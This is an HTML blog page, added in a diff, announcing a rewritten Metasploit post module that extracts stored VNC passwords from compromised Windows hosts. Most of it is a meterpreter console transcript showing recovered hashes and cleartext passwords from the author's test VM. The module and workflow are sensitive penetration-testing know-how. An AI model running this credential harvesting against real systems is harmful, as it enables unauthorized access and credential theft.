@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Metasploit VNC Password Extraction</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p><a href="http://carnal0wnage.blogspot.com/2011/03/vnc-passwords-and-metasploit-and-des.html">Chris Gates wrote a blog post</a> about the &lsquo;getvncpw&rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&rsquo;t get a chance to.</p>
+
+<p>Yesterday I saw this ticket: <a href="https://www.metasploit.com/redmine/issues/3183">https://www.metasploit.com/redmine/issues/3183</a> and thought to myself: &ldquo;Thats definitely within my coding ability to contribute a patch for&rdquo;. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC.</p>
+
+<p>changelog:</p>
+
+<ul>
+<li><p>Complete rewrite as a post module instead of a meterpreter script</p></li>
+
+<li><p>Passwords of less than 8 characters are correctly padded (<a href="https://www.metasploit.com/redmine/projects/framework/repository/revisions/12033">thanks jduck</a>)</p></li>
+
+<li><p>UltraVNC checks added</p></li>
+
+<li><p>TightVNC checks added for both VNC and it&rsquo;s control console</p></li>
+
+<li><p>Made it very simple to add new checks in either the registry or in a file</p></li>
+
+<li><p>Output is a bit more verbose (lets you know something is happening</p></li>
+
+<li><p>Reports authentication credentials found to database</p></li>
+
+<li><p>Identifies the port that VNC is running on as well</p></li>
+</ul>
+
+<p>It isn&rsquo;t in the metasploit trunk so until/if if gets added you can get it here:</p>
+
+<p><a href="/scripts-and-programs/metasploit/enum_vnc_pw.rb">http://www.room362.com/scripts-and-programs/metasploit/enum_vnc_pw.rb</a></p>
+
+<p>If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.</p>
+
+<p>Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :</p>
+
+<pre><code>msf exploit(handler) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; getuid
+Server username: XPBASELINEAdministrator
+meterpreter &gt; background
+msf exploit(handler) &gt; use post/windows/gather/enum_vnc_pw 
+msf post(enum_vnc_pw) &gt; set SESSION 1
+SESSION =&gt; 1
+msf post(enum_vnc_pw) &gt; show options
+
+Module options (post/windows/gather/enum_vnc_pw):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+msf post(enum_vnc_pw) &gt; run
+
+[*] Enumerating VNC passwords on XPBASELINE
+[*] Checking UltraVNC...
+[+] UltraVNC =&gt; A85B4C5976979DE93B =&gt; thisismy on port: 5900
+[+] VIEW ONLY: UltraVNC =&gt; DE2C1BA7393F6708B3 =&gt; 111 on port: 5900
+[*] Checking WinVNC3_HKLM...
+[*] Checking WinVNC3_HKCU...
+[*] Checking WinVNC3_HKLM_Default...
+[*] Checking WinVNC3_HKCU_Default...
+[*] Checking WinVNC_HKLM_Default...
+[*] Checking WinVNC_HKCU_Default...
+[*] Checking WinVNC4_HKLM...
+[+] WinVNC4_HKLM =&gt; c777b2de337a91cf =&gt; mypasswo on port: 5900
+[*] Checking WinVNC4_HKCU...
+[*] Checking RealVNC_HKLM...
+[*] Checking RealVNC_HKCU...
+[*] Checking TightVNC_HKLM...
+[+] TightVNC_HKLM =&gt; 7ebf1e76f732459f =&gt; authpass on port: 5900
+[*] Checking TightVNC_HKLM_Control_pass...
+[+] TightVNC_HKLM_Control_pass =&gt; f0299fd0e927cf2f =&gt; adminpas on port: 5900
+[*] Post module execution completed
+
+msf post(enum_vnc_pw) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; run post/windows/gather/enum_vnc_pw 
+
+[*] Enumerating VNC passwords on XPBASELINE
+[*] Checking UltraVNC...
+[+] UltraVNC =&gt; A85B4C5976979DE93B =&gt; thisismy on port: 5900
+[+] VIEW ONLY: UltraVNC =&gt; DE2C1BA7393F6708B3 =&gt; 111 on port: 5900
+[*] Checking WinVNC3_HKLM...
+[*] Checking WinVNC3_HKCU...
+[*] Checking WinVNC3_HKLM_Default...
+[*] Checking WinVNC3_HKCU_Default...
+[*] Checking WinVNC_HKLM_Default...
+[*] Checking WinVNC_HKCU_Default...
+[*] Checking WinVNC4_HKLM...
+[+] WinVNC4_HKLM =&gt; c777b2de337a91cf =&gt; mypasswo on port: 5900
+[*] Checking WinVNC4_HKCU...
+[*] Checking RealVNC_HKLM...
+[*] Checking RealVNC_HKCU...
+[*] Checking TightVNC_HKLM...
+[+] TightVNC_HKLM =&gt; 7ebf1e76f732459f =&gt; authpass on port: 5900
+[*] Checking TightVNC_HKLM_Control_pass...
+[+] TightVNC_HKLM_Control_pass =&gt; f0299fd0e927cf2f =&gt; adminpas on port: 5900
+meterpreter &gt; 
+</code></pre>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
